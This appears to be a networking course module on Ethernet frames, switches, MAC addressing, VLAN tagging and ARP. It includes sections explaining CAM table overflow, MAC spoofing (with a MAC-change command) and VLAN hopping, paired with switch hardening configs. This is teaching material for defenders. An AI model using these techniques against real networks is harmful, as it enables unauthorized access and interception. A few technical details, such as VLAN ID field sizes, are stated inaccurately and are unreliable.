Multicast MAC (01:00:5E:00:00:C8) to address a group of nodes on a LAN. Will have a Multicast address as the destination IP.
Provides the source MAC address.
Always a Unicast MAC.
Calculates the Cyclic Redundancy Check (CRC) on the Frame and appends to the Frame Check Sequence (FCS) field.
Controls access to/from the medium.
Sending bit-rate (bit speed)
Duplex (Half or Full) and CSMA/CD functions
Frame delimiting and recognition
Logical Link Control (LLC):
The LLC sub-layer is responsible for establishing, maintaining, and terminating logical links between network devices.
Provides services such as error detection and flow control to ensure reliable data transmission over the physical medium.
LLC defines the framing and addressing mechanism for data frames and handles the multiplexing of network layer protocols.
It acts as an interface between the Network Layer (Layer 3) and the MAC sub-layer, enabling communication between the two layers regardless of the underlying physical media.
Manages communication between devices over a single link of the network that includes error checking and data flow.
Multiplexes protocols to be sent over the MAC sub-layer.
Follows the IEEE 802.2 standard.
This layer provides the Ethertype to the MAC sublayer in the frame construction to identify the encapsulated protocol.
0x0800 for IPv4
0x0806 for ARP
0x86dd for IPv6
0x8100 for 802.1q VLAN tag


Resources


Instructor Note


1.3.2 Explain why and how frames are interpreted by different devices¶
Frames are fundamental units of data transmission at the Data Link Layer (Layer 2) of the OSI model. They contain data encapsulated within headers and trailers that provide essential information for transmitting and receiving data over a network. Different network devices interpret frames in various ways based on their roles and functionalities.



Resources


Instructor Note


1.3.2.1 Message Formatting Method and Terminology¶
The structure that is used for sending information over a network is often referred to as a message. This message varies greatly between different protocols and technologies. While exact formatting of particular messages are dependent on the technology or protocol being used, they typically utilize a similar formatting method consisting of a header, data, and footer.

Header - The header contains information related to control and communication processes between different protocol elements for different devices. This typically consists of information such as the source and destination address, clock information for transmission synchronization, and alert signals to indicate a packet is being transmitted.

Data - This is the actual data being transmitted which contains the payload. This payload may include another higher level message that consists of the same elements. For example, the data may contain information used to setup a logical connection before data is sent.

Footer - Commonly referred to as the trailer. The contents vary between communication methods or protocols. Usually the cyclical redundancy check (CRC) error-checking component is placed here. This is not always required for each protocol, but is especially important at the data-link layer.



It is important to understand that the data of any particular message sent in networking may contain higher-level information consisting of a header, data, and footer related to upper layer protocols. This will occur multiple times as data is passed down or up a protocol stack and is known as encapsulation or decapsulation.

The actual data transmission is vertical, however each layer is programmed as if the transmission is horizontal. This is possible with the use of protocols and interfaces. `

Protocols and Interfaces

Protocols - Protocols refer to communications occurring at the same layer within the OSI model (horizontal). Protocols allow communication to take place logically at layer 4 on two separate devices as if they were directly connected at layer 4.
Interfaces - Interfaces refer to information moving between different layers in the OSI model (vertical) on the same device. In order for protocols to communicate effectively they must pass information up and down the stack.
Encapsulation and Decapsulation



The communication between every layer other than the Physical layer is logical in nature. Therefore in order to pass information between protocol layers a protocol data unit (PDU) must be used. Each PDU for each protocol layer has specifications for the features or requirements at its layer. The PDU is passed down to a lower layer for transmission, the next lower layer is providing the service of handling the previous layer's PDU. This is why the previous layer's PDU is now referred to as an service data unit (SDU).

Protocol Data Units (PDU) for each OSI Layer:
Application, Presentation, and Session = Data
Transport = Segment (TCP) or Datagram (UDP)
Network = Packet
Data Link = Frame
Physical = Bits
The passing of information among the layers through this process may seem complex due to the formatting that must take place multiple times with PDU assembly and disassembly. However, this is necessary in providing modularity for network communication to take place.



Resources


Instructor Note


1.3.3 Identify how switches affect network traffic and the visibility of network traffic by other hosts¶
Switch Operation A switch allows multiple users to access the network and can provide segmentation to isolate traffic flow and reduce collisions, relieving network congestion in most cases. All switches add small latency delays due to packet processing. These delays could be caused by port speed, frame processing (Cut-through or Store and Forward), port delay, and buffering delay. Deploying switches unnecessarily can actually slow down network performance.

Building the MAC-Address Table:

Switches contain a special type of computer memory called Content-addressable memory (CAM) which allows very fast searching and table lookups.
CAM is much faster type of memory compared to RAM. This is essential for switches to do very fast table lookups.
CAM is a very expensive type of memory and generates very high levels of heat. Thus CAM is not typically used in most other types of electronic devices.
It is used to "look up" information (such as MAC addresses) and requires it to have an exact match.
Switches will dynamically build the MAC address table by examining the source MAC address of the frames received on a port.
The switch determines that if it receives a frame on an interface, whatever the source address is, that device can be reached if traffic was sent back through that interface.
Frame Switching process:

When a switch receives a frame, it will identify and check the destination MAC address information on the frame against the switch's MAC address table.
If the MAC address is found in the table, it will then send it out to the appropriate interface only.
If the MAC address is not found in the MAC address table, then it will flood the frame out of all ports (except the source port) in an attempt to get the frame to the destination MAC address.
If a reply is sent back, the switch will store the new MAC address information in its MAC address table and finally forward the frame. If no response is received, then the frame will be dropped.
If the frame is a broadcast MAC address (FF:FF:FF:FF:FF:FF) then the frame will be flooded out all ports (except the source port).
If the frame is a multicast MAC address (01:00:5E:00:00:C8) then the frame can be:
Sent out specific ports assigned to the group as managed by Cisco Group Management Protocol (CGMP) or Internet Group Management Protocol (IGMP) snooping.
Flooded out all ports (except the source port) if no Cisco Group Management Protocol (CGMP) or Internet Group Management Protocol (IGMP) snooping.
Switching Modes:

Store-and-Forward accepts and analyzes the entire frame before forwarding it to its destination.
It takes more time to examine the entire frame, but it allows the switch to catch certain frame errors and collisions and keep them from propagating bad frames through the network.
This method is required to switch frames between links of different speeds; this is due to bit-timing.
The speed at which the bits enter one interface may be slower than the speed at which the switch needs to send the bits to a different interface.
Cut-Through (sometimes called fast forward) only examines the destination address before forwarding it to its destination segment.
This is the fastest switching mode but requires the interfaces to be the same speed.
Fragment-Free reads at least 64 bytes of the Ethernet frame before switching it to avoid forwarding Ethernet runt frames (Ethernet frames smaller than 64 bytes).
A frame should have a minimum of 46 bytes of payload plus its 18-byte frame header for a total of 64 bytes.
Anything less that 64 bytes is considered a runt or collision fragement and will be dropped.
The switch's operation of using the MAC address table to forward traffic out to only the designated ports, helps reduce network traffic and allows for a more efficient flow of traffic. If a host does happen to receive a frame not intended for them, the host will simply drop it.



Resources


Instructor Note


1.3.3.1 CAM Table Overflow/Media Access Control (MAC) Attack¶
CAM Table Overflow/Media Access Control (MAC) Attack

A CAM (Content Addressable Memory) table overflow attack, also known as a MAC (Media Access Control) flooding attack, is a type of security exploit that targets network switches. This attack aims to overwhelm a switch's CAM table, which is used to store MAC address-to-port mappings, leading to a denial of service (DoS) condition or facilitating a man-in-the-middle attack.

This attack focuses on the Content Addressable Memory (CAM) table that stores the MAC addresses on a switch. A switch with only one VLAN will just have one CAM table. A switch will create a serarate CAM table for each VLAN supported by the switch.

CAM tables have a fixed memory size and this is what makes them a target for attack. The amount of MAC address the switch can "learn" varies depending on the vendor of the switch and factor such as:

Consumer-Grade Switches: 512 to 1,024 MAC addresses
Small to Medium Business (SMB) Switches: 1,024 to 8,000 MAC addresses
Mid-Range Managed Switches: 8,000 to 32,000 MAC addresses
Enterprise-Grade Switches: 32,000 to 128,000 MAC addresses
Data Center and Carrier-Grade Switches: 128,000 to 512,000 MAC addresses or more
Similar to a buffer overflow attack, the goal is to fill the switches table with bogus "learned" MAC addresses and see what happens. The attacker sits on one port and generates a vast number of "spoofed" MAC entries. When the CAM table is full, all additional MACs will not be learned and will default to "open". This means that traffic without a CAM entry will be flooded out on all ports of the VLAN in question. Traffic with a CAM entry won’t be affected, but neighbor switches could be.

Depending on the switch in question, this type of attack can be mitigated.


switch(config)# interface fa0/10
switch(config-if)# switchport port security
switch(config-if)# switchport port security maximum 1
switch(config-if)# switchport port security violation shutdown


Resources


Instructor Note


1.3.4 Describe MAC addressing¶
A Layer 2 Ethernet switch uses the destination MAC addresses to make forwarding decisions. It is completely unaware of the protocol being carried in the data portion of the frame, such as an IPv4 packet. The switch makes its forwarding decisions based only on the Layer 2 Ethernet MAC addresses.



Unique identifier assigned to a Network Interface (NIC) used for layer 2 addressing for communications between nodes.

MAC addresses are only locally significant.
MAC addresses are used to communicate with devices on the same newtwork only.
MAC addresses are removed/replaced by each OSI Layer 3 device or above.
Devices with the same MAC address on the same network will create conflilcts.
Devices with the same MAC address on different networks will not create any conflicts.
Length:

48 bits or 6 bytes in length represented by 12 hexadecimal digits.
Different Formatting:

Windows: 01-23-45-12-34-56
Unix/Linux: 01:23:45:12:34:56
Cisco: 1234.5612.3456
MAC Address is split into two main parts:

Organizationally Unique Identifier (OUI) - First 24 bits or 3 bytes or 6 HEX.
The OUI is typically assigned by IANA to a vendor, manufacturer, or other organization.
Virtual Machines (VM) do not normally use a particular OUI and may randomly assign their MAC addresses.
Vendor assigned - Last 24 bits or 3 bytes or 6 HEX.
IANA controls the assignment of the OUIs.
Universal versus local (U/L bit) (7th bit from the left in the MAC address)
Universally Administered Addresses (UAA) - bit set to 0
Locally administered (LAA) - bit set to 1
Unicast versus multicast (I/G bit) (8th bit from the left in the MAC address)
Unicast bit set to 0 the frame is meant to reach only one receiving NIC.
Unicast MAC with 8th bit off: fa:16:3e:12:1d:99
Multicast bit set to 1 the frame is treated as multicast frames and are flooded to all points on the network.
Typically starts with 01 in the first byte.
Multicast MAC with 8th bit on: 01:00:5e:00:00:00.
Broadcast - Frames are addressed to reach every computer on a given LAN segment using an address of all 'f's.
FF-FF-FF-FF-FF-FF or FF:FF:FF:FF:FF:FF or ffff.ffff.ffff.




Resources


Instructor Note


1.3.4.1 MAC Spoofing¶
Spoofing is the act of disguising a communication from an unknown source as being from a known or trusted source. Spoofing is an attack vector done at several different layers of the OSI. At the Data-link layer attackers will commonly spoof the MAC-address.

Originally MAC addresses were hard coded into the firmware of the NIC and could not be easily changed. This is why MAC addresses were commonly called "Firmware", "Hardware", or "Burned-in" addresses. In order to facilitate MAC spoofing attacks it required crafting of special frames with the MAC address pre-programmed in.

Today most MAC addresses are programmed using software. This makes modification of a device's MAC address much simpler. In order to perform a MAC spoofing attack the malicious actor can either change their MAC address to a known or trusted address or create crafted frames with the MAC address already programmed in.

How MAC Spoofing Works

Changing MAC Address: The attacker modifies their device's MAC address to match that of another device, such as an authorized network device. This can often be done using software tools or by altering network interface settings on the device.
Linux: Use ifconfig or ip link set dev eth0 address XX:XX:XX:XX:XX:XX to change the MAC address.
Windows: Use Device Manager or command-line utilities like netsh to modify MAC addresses.
Mac Spoofing Tools: Tools like macchanger on Linux can automate the process of changing MAC addresses.
Gaining Access: Once the attacker’s device appears to have the same MAC address as an authorized device, it can potentially gain unauthorized access to network resources or bypass MAC-based security measures.
Bypassing Filters and Controls: MAC address filters and access control lists (ACLs) that rely solely on MAC addresses for authentication can be circumvented by spoofing.
Implications of MAC Spoofing

Unauthorized Access: Attackers can gain access to network resources or systems that are restricted to specific MAC addresses.
Man-in-the-Middle Attacks: Attackers may intercept or alter network traffic between legitimate devices by sending specially crafted Gratuitous ARP messages to force 2 or more victims to send traffic through the attacker's system.
Network Disruption: Spoofing can lead to network conflicts or disruptions if multiple devices claim the same MAC address.
Identity Theft: In some cases, MAC spoofing can be used to impersonate individuals or devices for malicious purposes.
ARP-Cache poisoning: Attackers can modify the ARP cache of devices on the same network segment.
Prevention and Mitigation Strategies

Port Security: Configure port security features on network switches to limit the number of MAC addresses learned per port and set up dynamic or static MAC address bindings.
802.1X Authentication: Implement IEEE 802.1X network access control to enforce port-based authentication, ensuring that only authorized devices can connect to the network.
Static MAC Address Tables: Use static MAC address entries in switches where appropriate to prevent unauthorized devices from gaining access.
Network Segmentation: Segment networks to limit the impact of potential MAC spoofing attacks and reduce the scope of access.
Monitoring and Alerts: Set up monitoring and alerting for unusual MAC address changes or network behavior.
Encryption: Use encryption protocols to protect data transmitted over the network, reducing the risk of data interception during attacks.


DEMO MAC Spoofing


Resources


Instructor Note


1.3.5 Analyze 802.3 frame headers¶
In this section, we are going to step you through how to analyze a packet down to the frame, identifying different parts of the frame, and where they are located in the packet.

STEP 1: Open the following link: Cloud Shark Packet Captures

STEP 2: In the packet list pane (top section), click the first frame listed. You should see Echo (ping) request under the Info heading. This should highlight the line blue.

STEP 3: Examine the first line in the packet details pane (lower left section). This line displays the length of the frame; 74 bytes in this example.

STEP 4: The second line in the packet details pane shows that it is an Ethernet II frame. The source and destination MAC addresses are also displayed.

STEP 5: Click the arrow sign at the beginning of the second line in the packet details pane to obtain more information about the Ethernet II frame. You should see the Destination, Source, and Type.

STEP 6: Click on the Destination, observe the Packet Bytes pane (bottom right section) displays the highlighted hex and ASCII equivalent. You can see that the Destination starts at byte 0 and ends at byte 5. That is a total of 6 bytes or 48 bits.

STEP 7: Click on the Source, observe the Packet Bytes pane (bottom right section) displays the highlighted hex and ASCII equivalent. You can see that the Source starts at byte 6 and ends at byte 11. That is a total of 6 bytes or 48 bits.

STEP 8: Click on the Type, observe that the Type comes after the Source and is only 2 bytes in size. The Type of frame is identified as 0x0800 or IPv4.



Resources


Instructor Note


1.3.6 Describe the contents of an Ethernet header and frame¶




Specification Information: Defined by IEEE 802.3 standard, major participants in the development of the commonly used Ethernet II frame include XEC, Intel, and Xerox.

Structure:

Preamble (7 bytes) Consists of alternating 1's and 0's to allow network synchronization with receiver clocks. Ethernet is self-clocked, the clock is extracted from the signal. The clock is used to set the bit-timing. This is so that the receiver knows what speed the bits will be arriving at. This is stripped off at the NIC and not visible by packet analyzer software.
SFD (Start Frame Delimiter) (1 byte) Marks the end of the preamble, and the beginning of the Ethernet frame and send an announcement that data is about to be sent to any other hosts on the same network segment. This is stripped off at the NIC and not visible by packet analyzer software.

Destination MAC Addresses (6 bytes) (bytes 0-5)

Initial 6 bytes (48 bits) contain the Destination MAC address.
This can be a Unicast, Multicast, or Broadcst MAC address.
This is sent first to assist in switch operation of the cut-through mode.
Source MAC Addresses (6 bytes) (bytes 6-11)

Next 6 bytes (48 bits) contain the Source MAC Address.
This is always a Unicast MAC address.
It is worth noting that this is pretty much the only time that the destination address comes before the source. The source address will come first in most other headers that we deal with in this course.
Ethertype (2 bytes) (bytes 12-13) Used to indicate the next protocol encapsulated in the frame. This is provided by the LLC sub-layer.

IANA Ethertype Numbers controlled by IANA.org:
0x0800 - IPv4
0x0806 - ARP
0x86DD - IPv6
0x8100 - VLAN Tagging 802.1q (Payload Ethertype will follow at bytes 16-17 if using single tag or bytes 20-21 if using double tag.)
0x88A8 - Service VLAN tag identifier (S-Tag) (Q-in-Q tunnel) (Identical to using two 802.1q VLAN Tags.)
0x8863 or 0x8864 - PPP over Ethernet (PPPoE)
0x8847 or 0x8848 - MPLS
0x8892 - PROFINET Protocol
Data / Payload (Bytes 14+)

Consists of the encapsulated upper layer headers and data payload which may be 46-1500 bytes.
The minimum 46 bytes is based on the fact that the smallest "legal" ethernet frame size is 64 bytes; so 46 bytes of data with 14 bytes of Frame header and 4 bytes of Frame trailer (FCS/CRC) equates to 64 bytes. Anything less than 64-bytes is assumed to be a collision fragment (or "runt"). "Padding" is used when there is less than 46-bytes of data.
The maximum data bytes is determined by the MTU for the network segment. The MTU is the maximum size of the payload of the frame of the particular network. Ethernet II by default has a max MTU of 1500 bytes. This MTU is the amount of encapsulated data. MTU of 1500 plus the 18 byte header equates to 1518 bytes. Anything greater than this may be considered a "Jumbo" frame.
This typically is the size of the IP packet but can be the size of other encapsulated protocols like ARP or IPv6.
The Frame header is not calculated in to this size. So the frame size could be 1518 bytes (or more) in total when the 18 byte header is added. It's worth noting that the 1500 bytes is of total encapsulated information and not exclusively user data. This 1500 bytes includes the 20+ byte IPv4 header and 20+ byte TCP header. If VPN or tunneling is involved then the extra headers must also fit within this 1500 bytes.
MTU - Wikipedia:
1500 - Ethernet II (802.3)
17914 - 16 MBPS Token Ring
4464 - 4 MBPS Token Ring
4352 - FDDI
2304 - IEEE 802.11 Wi-FI (WLAN)
1280 - IPv6 path
1492 - Ethernet with LLC and SNAP
1480 - PPoE (WAN Miniport)
576 - X.25 (sending)
1600 - X.25 (receiving)
If there are any other headers included, such as IPSEC, IPv4 or TCP options, then this would mean that even less user data can be encapsulated.
FCS/CRC (Frame Check Sequence / Cyclical Redundancy Check) (4 bytes)

Mathematical formula calculated on the entire frame. This calculation is appended in the FCS field so that the receiver can determine if the contents of the frame were corrupted in transit. This is stripped off at the NIC and not visible by packet analyzer software.


Resources


Instructor Note


1.3.7 Describe an 802.1Q virtual local area network (VLAN) frame and how its frames differ from a standard 802.3 frame¶
An 802.1Q Virtual Local Area Network (VLAN) frame is a type of Ethernet frame that includes additional information for VLAN tagging. This tagging allows network administrators to logically segment a single physical network into multiple virtual networks, known as VLANs, to improve network performance, security, and manageability.



802.1Q is used to add a "tag" to identify to the receiving switch/router as to what VLAN the frame is being sent from. This tag is an additional 4 bytes of data that is appended between the Source MAC address and Ethertype field. This in essence increases the size of the frame header from its original 14 bytes to 18 bytes. The Ethertype field is "shoved over" from byte offset [12] to byte offset [16]. This tag is only applied across Trunk links. The switch/router is responsible to add this 4-byte tag when sending over any trunk links and to remove the tag when needing to send over an Access port. For example, prior to sending to a PC or printer.

Structure:

MAC Header (12 byte field)
Initial 6 bytes contain the Destination MAC address (bytes 0-5)
Next 6 bytes contain the Source MAC Address (bytes 6-11)
VLAN Tag (4 byte field) (bytes 12-15)
Tag Protocol ID (2 byte field)
Initial 2 bytes contain the new effective Ethertype field of 0x8100 indicating tagging
Tag Control Information (2 byte field)
Priority Code Point (3 bits)
This is used to add prioritization or QoS to VLANs
Drop Eligible Indicator (1 bit)
This adds drop eligibility to VLAN traffic in case of congestion
VLAN ID (12 bit field)
To specify the VLAN number. Can be 0x0000 to 0x0fff or 0 to 4095.
VLAN 0 and 4095 are reserved.
1 to 1005 Normal range
1003 to 1005 – reserved for Token Ring
1006 to 4094 – Extended Range
Ethertype (2 byte field) (bytes 16-17)
Used to indicate the next protocol encapsulated in the frame.
Data / Payload (46-1500 byte field) (bytes 18+)
Consists of the encapsulated upper layer headers and data payload which may be 46-1500 bytes
FCS/CRC (Frame Check Sequence / Cyclical Redundancy Check) (4 byte field)
A new calculation is conducted to accommodate the addition of the new tag information. This calculation is done by the switch or router that added the tag. This also will be stripped off by the receiving NIC and will not be viable by the network analyzer.


DEMO of VLAN tagging with ICMP


Resources


Instructor Note


1.3.7.1 Networks without VLANs¶
Networks without VLANs operate as a single broadcast domain, where all devices connected to the same physical network segment can communicate with each other without any logical segmentation.

Single Broadcast Domain:

In networks without VLANs, all devices connected to the same physical network segment receive broadcast traffic intended for the entire segment.
Broadcast traffic includes protocols such as ARP (Address Resolution Protocol) and DHCP (Dynamic Host Configuration Protocol), as well as other network-wide announcements. Each physical interface on a router is assigned to a different network. Will need one physical interface per network required. Future planning is critical as additional added networks can be difficult and costly to install.
All hosts on the switched LAN are part of the same network and only a router can segment networks.
In normal operation, when a switch receives a broadcast frame on one of its ports, it forwards the frame out all other ports except the port where the broadcast was received.
On a switch with only 1 vlan configured (vlan 1 by default) all ports belong to same broadcast domain.
Flat Network Structure:

Networks without VLANs typically have a flat network structure, where all devices are part of the same logical network.
Devices within the network can communicate directly with each other without the need for routing between subnets or VLANs.
Limited Segmentation and Isolation:

Without VLANs, there is limited segmentation and isolation of network traffic.
Devices in different departments, groups, or security zones share the same broadcast domain and have unrestricted access to each other's traffic, which can present security and performance challenges.
Broadcast Storms and Traffic Congestion:

In networks without VLANs, broadcast storms can occur if a device generates a large amount of broadcast traffic, overwhelming the network and causing performance degradation.
Similarly, network congestion can occur as all devices share the same network bandwidth, leading to potential bottlenecks.


Resources


Instructor Note


1.3.7.2 Networks with VLANs¶
Networks with VLANs (Virtual Local Area Networks) offer greater flexibility, security, and efficiency compared to traditional networks without VLANs. VLANs allow network administrators to logically segment a single physical network into multiple virtual networks, each with its own broadcast domain.

Logical Segmentation:

VLANs allow network administrators to logically segment the network into multiple broadcast domains, regardless of the physical network topology. Devices within the same VLAN can communicate with each other as if they were on the same physical network segment, while traffic between VLANs typically requires routing.
When VLANs are implemented on a switch, the transmission of unicast, multicast, and broadcast traffic from a host in a particular VLAN are restricted to the devices that are in that VLAN only.
Broadcast Isolation:

Each VLAN forms a separate broadcast domain, reducing the scope of broadcast traffic. Broadcast traffic generated within a VLAN is only forwarded to devices within that VLAN, improving network efficiency and reducing unnecessary traffic on other VLANs.
Enhanced Security:

VLANs provide enhanced security by segregating network traffic and controlling communication between different groups of devices. Access control lists (ACLs) and firewall policies can be applied at VLAN boundaries to restrict traffic flow between VLANs based on security policies.
Improved Performance:

By dividing the network into smaller broadcast domains, VLANs can reduce broadcast traffic and network congestion, leading to improved performance and better overall network efficiency.
Flexibility:

VLANs provide flexibility in network design and management, allowing administrators to easily add, remove, or modify VLAN configurations without physical reconfiguration of network infrastructure.
All the "tagging" processes are completely transparent to the "user" and is handled by the intermediary network devices.
When the switch receives a frame on a port configured in access mode and assigned a VLAN, the switch will then determine what interface to send the frame out. If the outgoing interface happens to be a trunk port, the switch inserts the VLAN tag in the frame header, recalculates the Frame Check Sequence (FCS), and sends the tagged frame out of that trunk port. Inversely, when a switch receives a tagged frame from a trunk link and it determines that the outgoing interface is an access port, the switch will remove the vlan tag and the FCS is recalculated again. The Type field is also reverted back to its original value. The 4-byte tag is removed and the Type field reverts back to its original location at [12:2].


Resources


Instructor Note


1.3.7.3 VLAN Types¶
There are 5 main types of VLANs. Only 1 VLAN can be assigned to any switch port. The only exception to this is the voice VLAN. The voice VLAN can be assigned with a data VLAN.

The VLAN Types are:

Default - VLAN 1 is the default vlan.

VLAN 1 will always be present on the switch and can not be deleted.
All ports will be assigned to VLAN 1 by default.
When VLAN assignment is removed from a port it will automatically be assigned to VLAN 1.
Data - VLANs assigned for user traffic.

Data VLANs are used to separate user data traffic based on different groups, departments, or functions.
Devices within the same data VLAN can communicate with each other as if they are on the same physical network.
A layer 3 device (such as a router) must be used for different data VLANs to intercommunicate.
Voice - VLAN assigned for use for voice traffic only.

Voice VLANs are used to separate voice traffic from data traffic in networks that support Voice over IP (VoIP) systems.
This VLAN is configured to carry voice traffic, ensuring quality of service (QoS) for voice communications.
Typically uses CDP messages from VOIP phones to be asigned else they will have to me stacically configured based on MAC address.
Management - A form of data VLAN but is used for switch/router remote management purposes.

A management VLAN is a VLAN used for managing networking devices such as switches, routers, and access points.
This VLAN is often used for remote device management, configuration, and monitoring purposes.
It helps secure management traffic by segregating it from user data traffic.
Native - VLAN used for switch/router generated traffic.

These are used for control traffic such as CDP, VTP, DTP, and STP. These do not normally have "tags" applied.
Native VLANs by default is VLAN 1 but is highly recommended to change.
The native VLAN is used on trunk links to carry untagged frames.
Frames from the native VLAN are not tagged when traversing trunk links, while frames from other VLANs are tagged.


Resources


Instructor Note


1.3.7.4 Describe an 802.1AD Double Tagging VLANs¶


IEEE 802.1ad is an Ethernet networking standard informally known as "Q-in-Q". The was added as an amendment to IEEE standard IEEE 802.1Q-1998. This technique was commonly used for provider bridging or tagging. A service provider could tag already tagged user frames across a service providers network and then strip it off at the other end; this is a form of tunneling.

This technique allowed the ability to insert more than one 4 byte tag into the frame. Each additional tag is inserted before the previous tag. The tags are then removed in reverse order. The first tag will be the typical 0x8100 Ethertype and include the user provided VLAN ID. Each additional tag can use 0x8100, 0x88A8 (Q-in-Q standard) or 0x9100 (non-standard) Ethertype and include the provider's VLAN ID.

Standard VLAN Tagging (IEEE 802.1Q):

In a standard VLAN tagging scenario, each Ethernet frame includes a 4-byte VLAN tag inserted between the source MAC address and the EtherType/Length field.
Ethertype used is 0x8100.
This VLAN tag contains information such as the VLAN ID (VID) that identifies the VLAN to which the frame belongs.
IEEE 802.1Q supports up to 4096 VLANs numbered 0 to 4095. VLAN 0 and 4095 are reserved and cannot be used. This leaves VLAN IDs 1-4094 to be used.
QinQ VLAN Tagging:

QinQ extends VLAN tagging by adding another layer of VLAN tags, effectively allowing VLAN tagging within VLAN tagging.
In a QinQ scenario, the original Ethernet frame is encapsulated within another VLAN tag, creating a "tagged outer frame" with its own VLAN ID.
This outer VLAN tag provides a second level of VLAN identification, allowing for hierarchical VLAN structures.
The original VLAN tag remains intact, providing the VLAN segmentation information within the inner frame.
Outer VLAN tag normally uses the standard Ethertype of 0x88A8 Service VLAN tag identifier (S-Tag) or possibly the non-standard 0x9100.
Usage and Benefits:

QinQ VLAN tagging is commonly used in service provider networks, particularly in metro Ethernet deployments.
It allows service providers to deliver multiple customer VLANs transparently over a single Ethernet link, preserving the VLAN segmentation of each customer.
By using QinQ, service providers can avoid VLAN ID conflicts between different customers' VLANs and simplify VLAN management.
QinQ also enables the creation of "service VLANs" or "provider VLANs" to carry traffic from multiple customer VLANs over a shared infrastructure while maintaining isolation between customers.
Frame Format:

In QinQ VLAN tagging, the Ethernet frame contains two 802.1Q headers:
The outer VLAN tag (or "service tag") contains the service provider's VLAN ID.
The inner VLAN tag (or "customer tag") contains the customer's VLAN ID.
The outer VLAN tag precedes the inner VLAN tag, and the original Ethernet frame is encapsulated between them.
IEEE 802.1ad was created for the following reasons:

802.1Q has a 12-bit VLAN ID field, which has a theoretical maximum of 4096 tags (212). With the growth of network this has become a limitation. A double-tagged frame however has two 12 byte VLAN ID fields. This can have a theoretical max of 4096×4096 or 16,777,216 VLAN IDs.

A tag stack creates a mechanism for some Internet Service Providers to encapsulate customer tagged 802.1Q traffic within another tag thus creating a Q-in-Q frame. The second (outer tag) is used to identify and segregate traffic from different customers; the inner tag is preserved from the original frame.

Using Q-in-Q provides a means of constructing Layer 2 tunnels, or even applying Quality of service (QoS) policies.

802.1ad is upward compatible with 802.1Q. Although 802.1ad is limited to two tags, there is no ceiling on the standard limiting a single frame to more than two tags, allowing for growth in the protocol. In practice Service Provider topologies often anticipate and utilize frames having more than two tags.

It is easier for networking equipment makers to modify their existing equipment by creating multiple 802.1Q headers than to modify their equipment to implement some hypothetical new non-802.1Q extended VLAN ID field header.



DEMO of 801.1ad headers


Resources


Instructor Note


1.3.7.5 Describe VLANS and Security vulnerabilities¶
VLAN hopping Attack

VLAN hopping is an exploit method of attacking networked devices on separate virtual LAN (VLAN) without traversing a router or other Layer 3 device. The concept behind VLAN hopping attacks is for the attacker on one VLAN to gain access to traffic on other VLANs that would normally not be accessible. Keep in mind that VLAN hopping is typically a one-way attack. It will not be possible to get any response from the target device unless methods are setup on the target to respond with similar vlan hopping methods.

There are three primary methods of VLAN hopping:

Switch Spoofing

In this attack, an attacking host imitates a trunking switch by crafting Dynamic Trunking Protocol (DTP) frames in order to form a trunk link with the switch.
With a trunk link formed the attacker can then use tagging and trunking protocols such as ISL or 802.1q.
Traffic for all VLANs is then accessible to the attacking host.
Tagging

This attack typically requires the attacker add the target 802.1Q tag manually to an Ethernet frame even though it is an access port.
This process is normally done by the switch. The switch will receive the frame and forward it out the trunk port leading to the target without it needing to be routed.
This method requires that the attacker and victim are separated by a trunk and success depends on the switch firmware being vulnerable.
Double Tagging

This attack works if the attacker knows what the "native VLAN" that is used on your organization. Typically VLAN 1 is used.
All VLANs will be "tagged" with its corresponding VLAN.
The Native VLAN however is intended for local network communication and is not tagged, thus anything tagged for the native VLAN will be stripped off.
The attacker will insert 2 tags into their frames.
The first tag will be for the Native VLAN and the second tag will be for whatever VLAN he is trying to access.
Upon receipt the switch will then remove the Native VLAN tag and will leave the second VLAN tag in tact.
This method also requires that the attacker and victim be separated by a trunk and a vulnerable switch.

switch(config)# vlan dot1q tag native
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport trunk native vlan 999


DEMO VLAN Hopping


Resources


Instructor Note


1.3.8 Describe the address resolution protocol (ARP)¶
The Address Resolution Protocol (ARP) is a networking protocol used to map an IP address to a MAC address within a local network segment. ARP operates at the Data Link Layer (Layer 2) of the OSI model and is essential for communication between devices on the same network.

The Address Resolution Protocol (ARP) is a Layer 2 protocol of the OSI model. It is used for discovering the Layer 2 or data link layer address (MAC address or even DLCI (Data Link Connection Identifier for a Frame Relay virtual circuit)), associated with a given Layer 3 or network layer address such as an IPv4 address. This mapping is critical in the operation of IPv4. ARP is replaced with ICMPv6 Neighbor Discovery (ND) Protocol suite when using IPv6.

ARP was defined in 1982 by RFC 826 which is Internet Standard STD 37. It has a wide range of various Operation Codes (op) to determine what type of ARP is being utilized. These codes are provided by IANA.

Each device maintains an ARP table (also known as an ARP cache) that stores mappings of IP addresses to MAC addresses. When a device receives an ARP reply, it adds the IP-to-MAC mapping to its ARP table. The ARP table is used to cache ARP mappings to optimize network performance and reduce ARP request/response traffic.



Structure:
Hardware type (HTYPE) This field specifies the network link protocol type.
1 = Ethernet
6 = Token Ring
15 = Frame Relay
Protocol type (PTYPE) This field specifies the internetwork protocol for which the ARP request is intended. The permitted PTYPE values share a numbering space with those for EtherType.
0x0800 = IPv4
Hardware length (HLEN) Length (in octets) of a hardware address.
6 = Byte size of Ethernet MAC addresses.
Protocol length (PLEN) Length (in octets) of addresses used in the upper layer protocol. (The upper layer protocol specified in PTYPE.)
4 = Byte size of IPv4 addresses.
Operation Specifies the operation that the sender is performing:
1 = ARP request
2 = ARP reply
3 = RARP request
4 = RARP reply
Sender hardware address (SHA) Media address of the sender. In an ARP request this field is used to indicate the address of the host sending the request. In an ARP reply this field is used to indicate the address of the host that the request was looking for. (Not necessarily address of the host replying as in the case of virtual media.) Switches do not pay attention to this field, particularly in learning MAC addresses. The ARP PDU is encapsulated in Ethernet frame, and that is why Layer 2 devices examine it.
In a ARP request, this will be the requestor's MAC address.
In a ARP reply, this will be the target's MAC address.
Sender protocol address (SPA) Internetwork address (usually IPv4 Address) of the sender.
In a ARP request, this will be the requestor's IP address.
In a ARP reply, this will be the target's IP address.
Target hardware address (THA) Media address of the intended receiver. In an ARP request this field is ignored. In an ARP reply this field is used to indicate the address of the host that originated the ARP request.
In a ARP request, this will be blank.
In a ARP reply, this will be the requestor's MAC address.
Target protocol address (TPA) Internetwork address (usually IPv4 Address) of the intended receiver.
In a ARP request, this will be blank.
In a ARP reply, this will be requestor's IP address.


Resources


Instructor Note


1.3.8.1 ARP Types¶
